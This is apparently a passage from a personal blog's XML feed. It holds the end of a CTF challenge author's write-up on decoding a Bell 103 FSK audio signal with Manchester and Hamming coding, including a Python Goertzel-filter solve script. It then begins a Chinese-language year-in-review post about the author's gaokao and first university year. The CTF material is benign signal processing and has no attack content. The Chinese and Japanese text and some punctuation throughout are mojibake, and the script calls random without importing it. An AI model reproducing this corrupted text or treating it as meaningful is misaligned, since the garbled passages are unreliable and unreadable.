å¯¹è¿™é¡¹å‘½ä»¤æä¸ºåæ„Ÿã€‚å†å²å‘Šè¯‰æˆ‘ä»¬ï¼Œç”±æ­¤æ›¾å‘ç”Ÿè¿‡å…­æ¬¡å›ä¹±ï¼Œå…¶ä¸­ä¸€ä¸ªçš‡å¸é€äº†å‘½ï¼Œå¦ ä¸€ä¸ªä¸¢äº†ç‹ä½â€¦å…³äºè¿™ä¸€äº‰ç«¯ï¼Œæ›¾å‡ºç‰ˆè¿‡å‡ ç™¾æœ¬å¤§éƒ¨è‘—ä½œï¼Œä¸è¿‡å¤§ç«¯æ´¾çš„ä¹¦ä¸€ç›´æ˜¯å—ç¦çš„ ï¼Œæ³•å¾‹ä¹Ÿè§„å®šè¯¥æ´¾çš„ä»»ä½•äººä¸å¾—åšå®˜ã€‚ â€”â€”ä¹”çº³æ£®Â·æ–¯å¨å¤«ç‰¹ï¼Œã€Šæ ¼åˆ—ä½›æ¸¸è®°ã€‹</code></p><p> It is a quote from Gulliverâ€™s Travels.  Fun fact: this paragraph is <strong>exactly the original source of the 2 words used in modern computer science: â€œbig-endianâ€ &amp; â€œlittle-endianâ€.</strong></p><p> This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.</p></li><li><p><code>Hamming code block size: 20bits</code></p><p> Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.</p></li><li><p><code>Bell 103</code></p><p> For those who ignored the problem description.</p></li></ol><h3 id="6-Script-to-Solve"><a href="#6-Script-to-Solve" class="headerlink" title="6. Script to Solve"></a>6. Script to Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># goertzel.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Module to create a Goertzel filter</span></span><br><span class="line"><span class="string">Original source: https://github.com/laurenschneider/audiodecoder</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Goertzel</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rate, freq</span>):</span><br><span class="line">        self.normalize = <span class="number">0</span></span><br><span class="line">        self.coeffs = <span class="number">0</span></span><br><span class="line">        self.sample_rate = rate</span><br><span class="line">        self.target_freq = freq</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculate_coeff</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Precompute coefficients needed for filter equation.</span></span><br><span class="line"><span class="string">        Coeff formulas courtesy of Prof. Massey</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        n = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">        w0 = (<span class="number">2</span> * np.pi * self.target_freq) / self.sample_rate</span><br><span class="line">        self.normalize = np.exp(<span class="number">1j</span> * w0 * n)</span><br><span class="line">        self.coeffs = np.array([np.exp((-<span class="number">1j</span>) * w0 * k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">self, samples</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Goertzel filter equation</span></span><br><span class="line"><span class="string">        :param samples: array of samples</span></span><br><span class="line"><span class="string">        :returns: amplitude</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        y = self.normalize * <span class="number">160</span> * np.dot(self.coeffs, samples)</span><br><span class="line">        ampl = np.<span class="built_in">abs</span>(y)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ampl</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decode.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Decode a wav file using a Goertzel filter.</span></span><br><span class="line"><span class="string">Modified from https://github.com/laurenschneider/audiodecoder</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> goertzel <span class="keyword">import</span> Goertzel</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> wavfile</span><br><span class="line"></span><br><span class="line">DATA = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">filepath = os.path.join(DATA, <span class="string">&quot;filename.wav&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read sample rate and data from audio file</span></span><br><span class="line">rate, data = wavfile.read(filepath)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">mark_freq = <span class="number">2225</span></span><br><span class="line">space_freq = <span class="number">2025</span></span><br><span class="line">mark_filter = Goertzel(rate, mark_freq)</span><br><span class="line">space_filter = Goertzel(rate, space_freq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate coefficients for each filter</span></span><br><span class="line">mark_filter.calculate_coeff()</span><br><span class="line">space_filter.calculate_coeff()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for each chunk of 160 samples</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">160</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        start = i - <span class="number">160</span></span><br><span class="line">        end = i</span><br><span class="line">        samples = data[start:end]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get amplitutes of sample set</span></span><br><span class="line">        mark_amp = mark_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line">        space_amp = space_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mark_amp &gt; space_amp:</span><br><span class="line">            <span class="comment"># bit is 1</span></span><br><span class="line">            to_add = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># bit is zero</span></span><br><span class="line">            to_add = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        bit_string = to_add + bit_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="built_in">len</span>(bit_string)+<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        start = x - <span class="number">9</span></span><br><span class="line">        end = x - <span class="number">1</span></span><br><span class="line">        message = <span class="built_in">chr</span>(<span class="built_in">int</span>(bit_string[start:end],<span class="number">2</span>)) + message</span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set target frequencies</span></span><br><span class="line">mark_freq = <span class="number">1270</span></span><br><span class="line">space_freq = <span class="number">1070</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create two filters</span></span><br><span class="line">mark_filter = Goertzel(rate, mark_freq)</span><br><span class="line">space_filter = Goertzel(rate, space_freq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate coefficients for each filter</span></span><br><span class="line">mark_filter.calculate_coeff()</span><br><span class="line">space_filter.calculate_coeff()</span><br><span class="line"></span><br><span class="line">bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">message = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for each chunk of 160 samples</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">160</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        start = i - <span class="number">160</span></span><br><span class="line">        end = i</span><br><span class="line">        samples = data[start:end]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get amplitutes of sample set</span></span><br><span class="line">        mark_amp = mark_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line">        space_amp = space_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mark_amp &gt; space_amp:</span><br><span class="line">            to_add = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            to_add = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        bit_string = to_add + bit_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingBolck</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(message)==<span class="number">15</span>)</span><br><span class="line">    message=message[::-<span class="number">1</span>]</span><br><span class="line">    code = <span class="number">0</span></span><br><span class="line">    m_pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (ind+<span class="number">1</span>)&amp;(ind): <span class="comment"># Not parity check bit</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(message[m_pos],<span class="number">2</span>):</span><br><span class="line">                code = code ^ (<span class="number">1</span>&lt;&lt;ind)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b1</span>)&lt;&lt;<span class="number">0</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b10</span>)&lt;&lt;<span class="number">0</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b100</span>)&lt;&lt;<span class="number">1</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b1000</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">            m_pos = m_pos + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    code = code ^ (<span class="number">1</span>&lt;&lt;random.randint(<span class="number">0</span>,<span class="number">19</span>))</span><br><span class="line"></span><br><span class="line">    retStr = <span class="string">&quot;&#123;0:020b&#125;&quot;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;from &quot;</span>+message+<span class="string">&quot; to &quot;</span>+retStr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingBolckInv</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(message)==<span class="number">20</span>)</span><br><span class="line">    code = <span class="built_in">int</span>(message,<span class="number">2</span>)</span><br><span class="line">    wrong = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span>&lt;&lt;ind)&amp;code:</span><br><span class="line">            wrong = wrong ^ (ind+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> wrong:</span><br><span class="line">        code = code ^ (<span class="number">1</span>&lt;&lt;(wrong-<span class="number">1</span>))</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (ind+<span class="number">1</span>)&amp;(ind): <span class="comment"># Not parity check bit</span></span><br><span class="line">            retStr = retStr + (<span class="string">&quot;1&quot;</span> <span class="keyword">if</span> code&amp;(<span class="number">1</span>&lt;&lt;ind) <span class="keyword">else</span> <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> retStr[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hamming</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">15</span>):</span><br><span class="line">        retStr = retStr + HammingBolck(message[ind:ind+<span class="number">15</span>])</span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingInv</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">20</span>):</span><br><span class="line">        retStr = retStr + HammingBolckInv(message[ind:ind+<span class="number">20</span>])</span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manchester</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        retStr += <span class="string">&quot;01&quot;</span> <span class="keyword">if</span> char==<span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&quot;10&quot;</span></span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manchesterInv</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">2</span>):</span><br><span class="line">        char = message[ind]</span><br><span class="line">        retStr += <span class="string">&quot;0&quot;</span> <span class="keyword">if</span> char==<span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line">bit_string=bit_string[::-<span class="number">1</span>]</span><br><span class="line">bit_string = HammingInv(manchesterInv(bit_string))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="built_in">len</span>(bit_string)+<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        start = x - <span class="number">9</span></span><br><span class="line">        end = x - <span class="number">1</span></span><br><span class="line">        message = <span class="built_in">chr</span>(<span class="built_in">int</span>(bit_string[start:end],<span class="number">2</span>)) + message</span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure><h3 id="7-Final-Words"><a href="#7-Final-Words" class="headerlink" title="7. Final Words"></a>7. Final Words</h3><p>In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: thatâ€™s because the former is channel coding, and the latter is source coding. We shouldnâ€™t just pick some random encryption and apply it to plaintext.</p><p> I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. Youâ€™ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).</p><p>ã”æ­¦é‹ã‚’ï¼</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Write-Up </tag>
            
            <tag> å‡ºé¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›æœ›2021ï¼Œå¹¶å°å°å±•æœ›2022</title>
      <link href="/2022/01/21/%E5%9B%9E%E6%9C%9B2021%EF%BC%8C%E5%B9%B6%E5%B0%8F%E5%B0%8F%E5%B1%95%E6%9C%9B2022/"/>
      <url>/2022/01/21/%E5%9B%9E%E6%9C%9B2021%EF%BC%8C%E5%B9%B6%E5%B0%8F%E5%B0%8F%E5%B1%95%E6%9C%9B2022/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ—¶å€™å†™è¿™ä¸œè¥¿æ€»æ˜¾å¾—ä¸å¤ªèµ¶è¶Ÿã€‚ç„¶è€Œç§ä»¥ä¸ºâ€œå¹´åº¦æ€»ç»“â€è¿™ç±»ä¸œè¥¿åªæœ‰ä¸€å¹´å®Œå…¨ç»“æŸäº†æ‰ç®—æ•°ã€‚è™½ç„¶ä»¥å‰ä¹Ÿå¹¶æ²¡æ€ä¹ˆå†™è¿‡ï¼Œä¸è¿‡æ¯•ç«Ÿ2021å¯¹æˆ‘æ¥è®²è¿˜ç®—æ˜¯ä¸€ä¸ªè½¬æŠ˜ç‚¹ï¼Œæœ‰æ›´ç‰¹æ®Šçš„ä¸€äº›â€¦â€¦æ„ä¹‰ï¼Ÿä¸å¦‚å°±è¯•ç€å†™å†™æµæ°´è´¦å§ã€‚<br>å‰åŠå¹´å…¶å®æ²¡å•¥å¥½è¯´çš„ï¼Œæ— éå°±æ˜¯åœ¨å¤‡æˆ˜é«˜è€ƒã€‚å¯æƒœæˆ‘æ²¡æœ‰é‚£æ ·çš„æ¯…åŠ›è®¤çœŸå­¦ä¹ ï¼Œå°±åƒæˆ‘æŠŠé«˜ä¸€é«˜äºŒå½»åº•è’åºŸåœ¨æ‰“æ¸¸æˆä¸Šä¸€æ ·ï¼Œé«˜ä¸‰æˆ‘ä¾æ—§è´¯å½»â€œå°è€ƒå°æ‘¸å¤§è€ƒå¤§æ‘¸â€çš„ä½œé£ã€‚æ— è®ºæ˜¯æˆäººç¤¼è¿˜æ˜¯é«˜è€ƒèª“å¸ˆå­¦æ ¡éƒ½æ²¡æå‡ºä»€ä¹ˆæ¿€æƒ…ï¼Œä¹Ÿè®¸æœ¬çœå°±æ˜¯è¿™ä¹ˆä½›ç³»å§ã€‚å‘¨æœ«å°±æ£é¼“äºŒæ‰‹ç”µå­åŸä»¶ï¼Œå¹³æ—¶å°±ç©ç¬”ã€‚è‡ªä¹ çš„æ—¶å€™æ€»æ˜¯ä¸€åˆ»ä¹Ÿåä¸ä½ï¼Œè‡ªå·±æºœåˆ°å…­æ¥¼çš„æ¥¼æ¢¯é—´è¾¹å¬æ­Œè¾¹çœ‹Kindleé¡ºå¸¦åœ¨é»‘æš—ä¸­è§‚å¯Ÿå°æƒ…ä¾£ã€‚ä¸€ç‚¹å‹åŠ›ä¹Ÿæ²¡æœ‰æ˜¯ä¸ç°å®çš„ï¼Œæ¯•ç«Ÿé‚£æ˜¯é«˜è€ƒã€‚å„ç±»æ•™è¾…ä¹°äº†ä¸å°‘ï¼Œå°½ç®¡å®Œæˆåº¦å ªå¿§ï¼Œä¸è¿‡æ¯•ç«Ÿæ–­æ–­ç»­ç»­åšäº†ä¹Ÿä¸å°‘ï¼Œæ”¶è·è¿˜æ˜¯æ¯”è¾ƒä¸°å¯Œçš„â€”â€”ä½†æ˜¯æˆ‘é«˜è€ƒå‰ä¸€å¤©è¿˜åœ¨ç‚’å¸ï¼ˆäºäº†500ï¼‰æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿæ‰€ä»¥æŸç§æ„ä¹‰ä¸Šæˆ‘çš„å­¦ä¹ å°±æ˜¯ä¸€ç§è¡¨æ¼”ï¼Œæœ¬è‰²è¿˜æ˜¯æ‘¸é±¼ğŸŸã€‚ç„¶è€Œè¿™ç§è¡Œäº‹é£æ ¼ä¸å®Œå…¨æ˜¯åå¤„ï¼Œè‡³å°‘æ€§ä»·æ¯”å¾ˆé«˜ï¼šå› ä¸ºæˆ‘èŠ±è´¹çš„ç²¾åŠ›å°‘ï¼Œäºæ˜¯å°±ä¸å¾—ä¸æ›´ç²¾å‡†ã€åŠŸåˆ©ã€é«˜è€ƒå¯¼å‘ä¸€äº›ã€‚æœ€åçš„é«˜è€ƒè¯­æ–‡è€ƒå¾—å‡ºå¥‡ä¼˜ç§€ï¼ˆè‡³å°‘å¯¹æˆ‘è¿™ä¸ªè‚šå­é‡Œæœåˆ®ä¸å‡ºåŠç‚¹å¢¨æ°´çš„æ¥è¯´ï¼Œæ¯•ç«Ÿæˆ‘å®Œå…¨æŠ›å¼ƒæ ¡å†…ææ–™è€Œæ˜¯å¯»æ±‚å„ç±»å‡ºç‰ˆç‰©çš„ç°æˆçŸ¥è¯†ï¼‰ï¼Œåè€Œæ˜¯æ•°å­¦ç‚¸äº†ã€‚å°½ç®¡ä¸ªä¾‹ä¸èƒ½è¯´æ˜ä»€ä¹ˆï¼Œä½†æˆ‘æƒ³ç†Ÿæ‚‰æˆ‘çš„äººä¸­ä¹Ÿè®¸æœ‰ä¸å°‘ä¼šè®¤åŒè¿™ä¸ªæƒ…å†µæ­£æ˜¯æœ¬å±Šè¯­æ–‡&amp;æ•°å­¦æ•™å­¦å¤±è´¥çš„ä¸€ä¸ªç¼©å½±ã€‚è¿˜å¥½ï¼Œæˆ‘å¾ˆé™©åœ°è¢«æµ™æ±ŸæŸå€’æ•°ç¬¬ä¸€211ï¼ˆä»…ä»…é«˜äºæœ€ä½å½•å–åˆ†æ•°çº¿1åˆ†ï¼‰å½•å–ï¼Œå®åœ¨æ˜¯å¹¸è¿ï¼Œä¸è¿‡è¿™æ˜¯åè¯äº†ã€‚é«˜ä¸‰æ²¡èƒ½å¥½å¥½å­¦ä¹ ï¼Œå€’æ˜¯è®¤è¯†äº†ä¸å°‘ä½¼ä½¼è€…ï¼Œä½œä¸ºä¸€åç«èµ›ç­æ··å­æˆ‘å¯¹æ­¤æ„Ÿåˆ°æ— æ¯”è£å¹¸ï¼šæ¯æ—¥åŸ‹å¤´çŒ›ä¹¦ä»¥è‡³äºè¯¾é—´éƒ½è·‘æ­¥å»å«ç”Ÿé—´çš„ï¼Œåœ¨æ“åœºæ´»åŠ¨æˆ–æ˜¯ä½“è‚²è¯¾æ‹¿ç€æ¿å¤¹èµ¶ä½œä¸šçš„ï¼Œå¦‚æ­¤ç§ç§èƒ½äººå¿—å£«æ¯æ¯ç›®å‡»ä¹‹æ€»ä»¤æˆ‘å¿ƒç”Ÿæ„§ç–šï¼Œæ­¤æ—¶å†çœ‹ä¸€çœ¼æˆ‘è¢«æ²¡æ”¶äº†4æ¬¡ç”šè‡³3æ¬¡çš„æ‰‹æœºä¸Šçš„é«˜è€ƒå€’è®¡æ—¶ï¼Œä¸ç”±å¾—å¿ƒç”Ÿç„¦è™‘ã€‚æœ‰æ—¶æƒ³åˆ°é©¬ä¸Šé«˜è€ƒï¼Œç«Ÿå¿ä¸ä½å¤§å“­ï¼Œå†çº¢ç€çœ¼å›æ•™å®¤ç»§ç»­è¯¥å¹²å•¥å¹²å•¥ã€‚å¯æƒœæœ¬äººæ²¡æœ‰åŒ–å‹åŠ›ä¸ºåŠ¨åŠ›çš„ä½“è´¨ï¼Œè‡ªç„¶ä¹Ÿæ²¡æœ‰åŒ–æ‘†çƒ‚ä¸ºç¥å¥‡çš„æ€åº¦è¿›è¡Œé«˜è€ƒå†²åˆºï¼Œåªæ˜¯å—Ÿå¹è‰¯ä¹…è€Œå¤æ‘¸å¤§é±¼ï¼Œåœ¨å’ŒåŒå­¦çš„è°ˆç¬‘é£ç”Ÿä¸­æ¶ˆç£¨å®è´µçš„ã€åœ¨æ–‡è‰ºä½œå“ä¸­è¢«æè¿°ä¸ºâ€œç¾å¥½é’æ˜¥å°¾å£°â€ï¼ˆè¿«çœŸï¼‰çš„é«˜ä¸‰å¤‡è€ƒæ—¶é—´ã€‚ä½†ç»å¤§éƒ¨åˆ†åŒå­¦éƒ½äººå¾ˆå¥½è¿˜å¾ˆå¼ºï¼èƒ½å¤Ÿè®¤è¯†å®åœ¨æ˜¯å¾ˆå¹¸è¿ã€‚æ­¤å¤–å€Ÿç”±ç«èµ›è¿™ä¸€æ¸ é“åœ¨ç½‘ä¸Šä¹Ÿè®¤è¯†äº†è®¸å¤šå¤§ä½¬ï¼Œé«˜å…´é«˜å…´ã€‚ä¸è¿‡ä¹Ÿå¸Œæœ›èƒ½çæƒœè¿™æ ·çš„ç»å†ï¼Œæœ‰æ—¶å€™å¤±å»çœŸçš„æ˜¯å¾ˆçªç„¶çš„ï¼Œä¸å¯æŒ½å›çš„ã€‚<br>é«˜è€ƒç»“æŸï¼Œé‚£ä¸ªæš‘å‡ç–¯ç‹‚åœ°è”æœºæ¸¸æˆï¼Œåœ¨å®¶é‡Œé€ 